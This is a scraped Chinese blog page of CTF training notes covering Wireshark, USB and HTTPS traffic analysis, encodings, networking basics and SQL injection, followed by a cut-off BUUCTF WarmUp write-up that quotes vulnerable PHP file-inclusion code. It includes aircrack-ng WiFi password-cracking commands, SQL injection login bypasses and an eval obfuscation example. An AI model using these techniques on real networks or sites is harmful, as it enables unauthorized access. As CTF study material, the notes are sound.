<h5 id="常见的HTTP流关键内容："><a href="#常见的HTTP流关键内容：" class="headerlink" title="常见的HTTP流关键内容："></a><em>常见的HTTP流关键内容：</em></h5><h6 id="1、HTML中直接包含重要信息。"><a href="#1、HTML中直接包含重要信息。" class="headerlink" title="1、HTML中直接包含重要信息。"></a>1、HTML中直接包含重要信息。</h6><h6 id="2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传"><a href="#2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传" class="headerlink" title="2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传"></a>2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传</h6><h6 id="3、一句话木马，POST请求，内容包含eval，内容使用base64加密"><a href="#3、一句话木马，POST请求，内容包含eval，内容使用base64加密" class="headerlink" title="3、一句话木马，POST请求，内容包含eval，内容使用base64加密"></a>3、一句话木马，POST请求，内容包含eval，内容使用base64加密</h6><p>HTTP流：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604080014248.png" alt="image-20200604080014248"></p>
<p>也可以保存成另一种格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604081346525.png" alt="image-20200604081346525"></p>
<p>例如：</p>
<p>打开事先准备好的题，找到对应的流，然后进行数据流追踪，筛选值里面就有可能有flag值</p>
<p>如果当流很多的时候可以使用数据流筛选里面的命令进行删选。</p>
<p>这个题里面就有一个base64加密得值，进行解密即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604094211391.png" alt="image-20200604094211391"></p>
<h5 id="WireShark-数据提取"><a href="#WireShark-数据提取" class="headerlink" title="WireShark 数据提取"></a>WireShark 数据提取</h5><p>1、使用wireshark可以自动提取通过http传输的文件内容。</p>
<p>文件 —&gt; 导出对象 —&gt; HTTP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604094511491.png" alt="image-20200604094511491"></p>
<p>可以看到一个eval，说明这是以一个一句话木马存储的文件，第一段是base64加密的文件</p>
<p>89504E47是png的图片的文件头，将下面的16进制全部复制到一个文本，使用010Editor打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604105348978.png" alt="image-20200604105348978"></p>
<p>2、wireshark手动提取文件内容。</p>
<p>点击想要的数据包，选定media type的位置</p>
<p>右键 —&gt; 导出分组字节流 或者 点击菜单栏  文件 —&gt; 导出分组字节流，快捷键Ctrl+H在弹出的框中将文件保存成二进制文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604110757287.png" alt="image-20200604110757287"></p>
<h5 id="无线wifi流量包"><a href="#无线wifi流量包" class="headerlink" title="无线wifi流量包"></a>无线wifi流量包</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604152044165.png" alt="image-20200604152044165"></p>
<p>aircrack-ng工具进行wifi密码破解</p>
<p>1、用aircrack-ng检查cap包：arcrack-ng xxx.cap</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605102927768.png" alt="image-20200605102927768"></p>
<p>2、用aircrack-ng跑字典进行握手包破解：aircrack-ng xxx.cap -w pass.txt</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605111002987.png" alt="image-20200605111002987"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605111056255.png" alt="image-20200605111056255"></p>
<h4 id="USB流量包文件分析"><a href="#USB流量包文件分析" class="headerlink" title="USB流量包文件分析"></a>USB流量包文件分析</h4><h5 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h5><h6 id="USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。"><a href="#USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。" class="headerlink" title="USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。"></a>USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。</h6><p>USB协议的数据部分在Leftover Capture Data域之中。</p>
<p>右键leftover capture data —&gt; 应用为例。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605111406012.png" alt></p>
<h5 id="USB键盘流量抓取分析"><a href="#USB键盘流量抓取分析" class="headerlink" title="USB键盘流量抓取分析"></a>USB键盘流量抓取分析</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606213030411.png" alt="image-20200606213030411"></p>
<p>Leftover Capture Data数据提取方式1：</p>
<p>文件 —&gt; 导出分组解析结构 —&gt; 为CSV，导出保存成一个.csv文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606213318200.png" alt="image-20200606213318200"></p>
<p>Leftover Capture Data数据提取方式 2：</p>
<p>使用wireshark提供的命令工具 tshark，可以将Leftover Capture Data数据单独复制出来。</p>
<p><code>tshark -r 流量包名 -T flelds -e usb.capdata &gt; 要保存的文件</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606215013376.png" alt="image-20200606215013376"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606221053278.png" alt="image-20200606221053278"></p>
<h5 id="USB鼠标流量抓取分析"><a href="#USB鼠标流量抓取分析" class="headerlink" title="USB鼠标流量抓取分析"></a>USB鼠标流量抓取分析</h5><h6 id="鼠标流量与键盘流量不同，-鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。"><a href="#鼠标流量与键盘流量不同，-鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。" class="headerlink" title="鼠标流量与键盘流量不同， 鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。"></a>鼠标流量与键盘流量不同， 鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。</h6><p><strong>鼠标数据包</strong>的数据长度为<strong>4个字节</strong>，<strong>第一个字节代表按键</strong>，当去<strong>oxoo</strong>时，代表<strong>没有按键</strong>；<strong>oxo1时</strong>，代表<strong>按左键</strong>，为<strong>oxo2时</strong>，代表当前<strong>按键为右键</strong>。</p>
<p><strong>第二个字节</strong>代表<strong>左右偏移</strong>；当值为<strong>正</strong>时，代表<strong>右移多少像素</strong>。当值为<strong>负</strong>时，代表<strong>左移多少像素</strong>。同理，<strong>第三个字节</strong>代表<strong>上下偏移</strong>。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606222850803.png" alt="image-20200606222850803"></p>
<p>土脚本</p>
<p>if btn_flag需要自行调整0,1,2</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606225712699.png" alt="image-20200606225712699"></p>
<p>第一张是没有将其导入一个文件，第二张 加上一个导出符 <code>&gt; 文件名</code>将信息保存到这个文档中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606225949760.png" alt="image-20200606225949760"></p>
<p>用gnuplot工具把坐标画出来。</p>
<p>输入<code>gnuplot</code>进入到gnuplot命令行</p>
<p>使用<code>plot &quot;xy.txt&quot;</code>命令根据这个文件坐标画一张图 </p>
<p>可以看到这张图是倒过来的，只需要将其复制，旋转一下就可以。。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606230805565.png" alt="image-20200606230805565"></p>
<h5 id="HTTPS流量包文件分析"><a href="#HTTPS流量包文件分析" class="headerlink" title="HTTPS流量包文件分析"></a>HTTPS流量包文件分析</h5><h6 id="HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。"><a href="#HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。" class="headerlink" title="HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。"></a>HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。</h6><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232137032.png" alt="image-20200606232137032"></p>
<p>如果看到TLS和HTTPS(443)就可以判断出他是加密之后的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232037932.png" alt="image-20200606232037932"></p>
<p>英文版：Preferences —&gt; Protocols —&gt; SSL —&gt; Edit RSA keys list</p>
<p>中文版：编辑 —&gt; 首选项 —&gt; Protocols —&gt; SSL —&gt; Edit RSA keys list</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232356753.png" alt="image-20200606232356753"></p>
<h6 id="导入Key后出现原始的HTTP流量。"><a href="#导入Key后出现原始的HTTP流量。" class="headerlink" title="导入Key后出现原始的HTTP流量。"></a>导入Key后出现原始的HTTP流量。</h6><p>右键 —&gt; 追踪流 —&gt; SSL流/HTTP流</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232626017.png" alt="image-20200606232626017"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232750372.png" alt="image-20200606232750372"></p>
<h4 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h4><h5 id="密码编码学"><a href="#密码编码学" class="headerlink" title="密码编码学"></a>密码编码学</h5><p>（1）<strong>密码编码学</strong>是密码学的一个分支，研究与信息安全（例如：机密性、完整性、可鉴别性）有关的数学技术。</p>
<p>（2）<strong>密码编码学</strong>时包含数据变换的原 理、工具和方法的一门学科，这种数据变换的目的是为了隐藏数据的信息内容，阻止对数据的篡改以及防止未经认可使用数据。</p>
<p>（3）<strong>密码编码学</strong>是论述使明文变得不可懂的密文，以及把已加密的消息变换成可懂形式的艺术和技巧。</p>
<h5 id="对称加密不对称加密"><a href="#对称加密不对称加密" class="headerlink" title="对称加密不对称加密"></a>对称加密不对称加密</h5><ul>
<li>对称密码算法：<strong>解密秘钥和加密秘钥相同</strong>，或实质上等同，即从一个易于推出另一个。又称传统密码算法、密码秘钥算法或单秘钥算法。<ul>
<li><strong>DES、3DES、IDEA、AES</strong></li>
</ul>
</li>
<li>非对称密码算法：<strong>加密秘钥和解密秘钥不同</strong>，从一个很难推出另一个。又叫公钥密码算法。<strong>其中的加密秘钥可以公开，称为公开密钥</strong>，简称<strong>公钥</strong>；<strong>解密秘钥必须比保密，称为私人秘钥</strong>，简称<strong>私钥</strong>。<ul>
<li><strong>RSA、ECC、EIGamal</strong></li>
</ul>
</li>
</ul>
<h5 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h5><p>​        数据摘要算法是密码学算法中非常重要的一个分支，他通过对所有数据提取指纹信息以实现数据签名、数据完整性校验等功能，由于其不可逆性，有时候会被用作敏感信息的加密。数据摘要算法也被称为<strong>哈希（Hash）算法</strong>、<strong>散列算法</strong>，常见的摘要算法有<strong>MD5</strong>和<strong>SHA</strong></p>
<p>​        在互联网上进行大文件传输时，都要得用MD5算法产生一个与文件匹配的、存储MD5值得文本文件（后缀名为<strong>.md5</strong>或<strong>.mdsum</strong>），这样接受者在接收到文件后，就可以利用与SFV类似的方法来检查文件完整性，对大多数大型软件公司或开源组织都是以这种方式来校验数据完整性，而且部分操作系统也使用此算法来对用户密码进行加密，另外，他也是目前计算机犯罪中数据取证最常用的算法。</p>
<p>​        SHA中SHA1的应用范围较为广泛，主要用于CA个数字证书中，另外在互联网中流行的BT软件中，也是使用SHA1来进行文件校验的，由于SHA系列算法的数据摘要长度较长，因此其运算速度与MD5相比，也相对较慢。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607102755666.png" alt="image-20200607102755666"></p>
<h5 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h5><p>​        ASCII码使用指定的7位或8位二进制数组来表示128或256种可能的字符。标准ASCII码也叫基础ASCII码，使用7位二进制数（剩下的1位二进制为0）来表示所有的大写和小写字母，数字0到9、标点符号，以及在美式英语中使用的特殊控制字符</p>
<p>如果要进行ASCII吗转换，直接在百度搜索ASCII在线转换就可以</p>
<p><a href="http://ctf.ssleye.com/这里面有各种" target="_blank" rel="noopener">http://ctf.ssleye.com/这里面有各种</a> 转换工具</p>
<p>或者下载一个  <strong>小葵多功能转换工具</strong>。 </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607141505200.png" alt="image-20200607141505200"></p>
<h5 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h5><p>​        Base64顾名思义就是用64个可显示字符表示所有ASC字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8为字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用’    =’，因此编码后输出的文本末尾<strong>可能出现1或2个’     =’</strong></p>
<p>解密地址可以百度搜索在线工具，活着使用小葵，或者使用上面的网址里面的工具，都可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607144110784.png" alt="image-20200607144110784"></p>
<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>​        url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”，比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。</p>
<p>解码地址，百度搜在线解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607152252672.png" alt="image-20200607152252672"></p>
<h5 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h5><p>​        Unicode码扩展自ASCII字元集。在严格的ASCII中，每个字元用7位元表示，或者电脑上普遍使用的没字元有8位元宽；而Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能与电脑通讯的字元、象形文字和其他符号。</p>
<p>特点：密文中有多个\uxxx</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607154702904.png" alt="image-20200607154702904"></p>
<h5 id="JS混淆"><a href="#JS混淆" class="headerlink" title="JS混淆"></a>JS混淆</h5><p>​        有些时候开发者为了保护劳动成果可以通过对javascript的变量名称和过程名称进行编码，从而起到混淆JS代码的作用，通常使用eval函数进行混淆处理，该函数可以计算字符串，并执行其中的JS代码。</p>
<p>​        如：对<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>进行16进制转换，然后使用eval函数进行读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>特点：通常在JS脚本里使用eval与function函数进行混淆</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607155222852.png" alt="image-20200607155222852"></p>
<h4 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h4><p>简单过一下</p>
<h5 id="网络起源"><a href="#网络起源" class="headerlink" title="网络起源"></a>网络起源</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608230118116.png" alt="image-20200608230118116"></p>
<h5 id="家庭网络"><a href="#家庭网络" class="headerlink" title="家庭网络"></a>家庭网络</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608230408330.png" alt="image-20200608230408330"></p>
<h5 id="企业网路基本构架"><a href="#企业网路基本构架" class="headerlink" title="企业网路基本构架"></a>企业网路基本构架</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608231043595.png" alt="image-20200608231043595"></p>
<h5 id="网络的组成和结构"><a href="#网络的组成和结构" class="headerlink" title="网络的组成和结构"></a>网络的组成和结构</h5><p><strong>终端设备</strong>：PC、iphone、ATM等等。</p>
<p><strong>网络互连设备</strong>：集线器、交换机、路由器、防火墙、IDS、IPS、ICG、AP、基站</p>
<p><strong>用于连接设备的链接  /  介质：</strong>：同轴电缆，双绞线，光纤，无线</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608231125684.png" alt="image-20200608231125684">   </p>
<h4 id="通信模型介绍"><a href="#通信模型介绍" class="headerlink" title="通信模型介绍"></a>通信模型介绍</h4><h5 id="协议的必要性"><a href="#协议的必要性" class="headerlink" title="协议的必要性"></a>协议的必要性</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608231822951.png" alt="image-20200608231822951"></p>
<h5 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608232120916.png" alt="image-20200608232120916"></p>
<h5 id="分层模型-TCP-IP标准模型与对等模型"><a href="#分层模型-TCP-IP标准模型与对等模型" class="headerlink" title="分层模型-TCP/IP标准模型与对等模型"></a>分层模型-TCP/IP标准模型与对等模型</h5><p>4层模型和5层模型，将7层模型进行合并。</p>
<ul>
<li>应用层：APP产生的数据</li>
<li>表示层：格式转换</li>
<li>会话层：区分不同会话</li>
<li>传输层：端到端连接；通过端口号识别上层协议；比如443识别https；80-http；<ul>
<li>端口号：小于1023的是知名端口，一些应用层协议都是默认为知名端口</li>
</ul>
</li>
<li>网络层：IP寻址</li>
<li>数据链路层：MAC寻址   —-物理地址（每台设备都有唯一的地址）</li>
<li>物理层：决定数据在不同介质的传输方式</li>
</ul>
<ul>
<li>报文五元组：<ul>
<li>应用层：协议</li>
<li>传输层：源端口、目的端口</li>
<li>网络层：源IP、目的IP</li>
</ul>
</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608232644522.png" alt="image-20200608232644522"></p>
<h4 id="web基础-sql注入"><a href="#web基础-sql注入" class="headerlink" title="web基础+sql注入"></a>web基础+sql注入</h4><h5 id="WEB应用的基础架构"><a href="#WEB应用的基础架构" class="headerlink" title="WEB应用的基础架构"></a>WEB应用的基础架构</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609092657733.png" alt="image-20200609092657733"></p>
<h5 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609102009198.png" alt="image-20200609102009198"></p>
<h5 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609102040418.png" alt="image-20200609102040418"></p>
<h5 id="HTTP请求报文—请求行"><a href="#HTTP请求报文—请求行" class="headerlink" title="HTTP请求报文—请求行"></a>HTTP请求报文—请求行</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609102341778.png" alt="image-20200609102341778"></p>
<h5 id="HTTP请求报文—请求头"><a href="#HTTP请求报文—请求头" class="headerlink" title="HTTP请求报文—请求头"></a>HTTP请求报文—请求头</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609103242825.png" alt="image-20200609103242825"></p>
<h5 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609103713600.png" alt="image-20200609103713600"></p>
<h5 id="HTTP响应报文——状态行"><a href="#HTTP响应报文——状态行" class="headerlink" title="HTTP响应报文——状态行"></a>HTTP响应报文——状态行</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609103747586.png" alt="image-20200609103747586"></p>
<h5 id="信息收集类解题"><a href="#信息收集类解题" class="headerlink" title="信息收集类解题"></a>信息收集类解题</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609105410884.png" alt="image-20200609105410884"></p>
<h5 id="例题1，解题步骤"><a href="#例题1，解题步骤" class="headerlink" title="例题1，解题步骤"></a>例题1，解题步骤</h5><p>这是简单的信息收集</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609105851147.png" alt="image-20200609105851147"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609110822988.png" alt="image-20200609110822988"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609110837706.png" alt="image-20200609110837706"></p>
<h5 id="前端代码类解题"><a href="#前端代码类解题" class="headerlink" title="前端代码类解题"></a>前端代码类解题</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609111918870.png" alt="image-20200609111918870"></p>
<p>例：</p>
<p>解析：F12，找到maxlength修改字符最大长度</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609111940281.png" alt="image-20200609111940281"></p>
<h5 id="HTTP协议类"><a href="#HTTP协议类" class="headerlink" title="HTTP协议类"></a>HTTP协议类</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609112733121.png" alt="image-20200609112733121"></p>
<p>例：</p>
<p>页面返回你是来自谷歌吗？</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609112850721.png" alt="image-20200609112850721"></p>
<p>这里一看就知道要是用referer来伪造访问网址，只需要是用burp抓包，然后添加referer就可以，然后将谷歌网址输入即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609113255514.png" alt="image-20200609113255514"></p>
<h4 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h4><h5 id="数据库系统的基本概念"><a href="#数据库系统的基本概念" class="headerlink" title="数据库系统的基本概念"></a>数据库系统的基本概念</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609115245391.png" alt="image-20200609115245391"></p>
<h5 id="关系型数据库系统特点"><a href="#关系型数据库系统特点" class="headerlink" title="关系型数据库系统特点"></a>关系型数据库系统特点</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609134441300.png" alt="image-20200609134441300"></p>
<h5 id="结构化查询语言sql"><a href="#结构化查询语言sql" class="headerlink" title="结构化查询语言sql"></a>结构化查询语言sql</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609134659116.png" alt="image-20200609134659116"></p>
<h5 id="SELECT语句——基本查询"><a href="#SELECT语句——基本查询" class="headerlink" title="SELECT语句——基本查询"></a>SELECT语句——基本查询</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609135101423.png" alt="image-20200609135101423"></p>
<h5 id="SELECT语句——AND和OR运算"><a href="#SELECT语句——AND和OR运算" class="headerlink" title="SELECT语句——AND和OR运算"></a>SELECT语句——AND和OR运算</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609135152489.png" alt="image-20200609135152489"></p>
<h5 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609140939827.png" alt="image-20200609140939827"></p>
<h5 id="经典的万能密码"><a href="#经典的万能密码" class="headerlink" title="经典的万能密码"></a>经典的万能密码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144039740.png" alt="image-20200609144039740"></p>
<p>使用正常语句查询，返回错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144106842.png" alt="image-20200609144106842"></p>
<p>使用万能密码进行查询</p>
<p>成功返回，</p>
<p><strong>原理</strong>：or和and都有的时候先判断and也就是”1” and “123456”判断，这肯定是错的，错的就等于0</p>
<p>俺就判断 “1”=”0”，因为1不等于0所以也是错了，username=”admin”是正确的所以正确。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144930905.png" alt="image-20200609144930905"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144940562.png" alt="image-20200609144940562"></p>
<p>因为是三种万能密码，所以还有两种，原理相同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609145305816.png" alt="image-20200609145305816"></p>
<p>可以使用工具来进行扫描，sqlmap，椰树都可以</p>
<p><img src="/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200609152002615.png" alt="image-20200609152002615"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-BUUCTF题" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/BUUCTF%E9%A2%98/" class="article-date">
  	<time datetime="2020-07-25T01:17:12.594Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/BUUCTF%E9%A2%98/">
        BUUCTF题
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113206180.png" alt="image-20200616113206180"></p>
<p>查看源码看看</p>
<p>访问这个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113313805.png" alt="image-20200616113313805"></p>
<p>查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113412110.png" alt="image-20200616113412110"></p>
<p>而且观察顶部代码发现有一个hint.php的文件，查看一下</p>
<p>告诉我们flag在ffffllllaaaagggg中。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616114219183.png" alt="image-20200616114219183"></p>
<p> 回到source.php代码<br> 首先看下面部分:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 字符不能为空</span><br><span class="line">if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line"># 提交变成字符串形式</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line"># 通过checkFile校验</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];	# 包含$_REQUEST[&#39;file&#39;]文件</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    # 打印滑稽表情</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>if语句传入file变量满足三个条件</p>
<ul>
<li>非空</li>
<li>类型为字符串</li>
<li>能够通过checkFile()函数校验</li>
</ul>
<p>只有同时满足这三个条件才能打印file中的文件，否则打印滑稽表情</p>
<p>查看checkFile()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># 高光显示</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"># 定义一个emmm的类</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line"># 将传入的参数赋值给$page</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">        # 声明$whitelist白名单数组</span><br><span class="line">            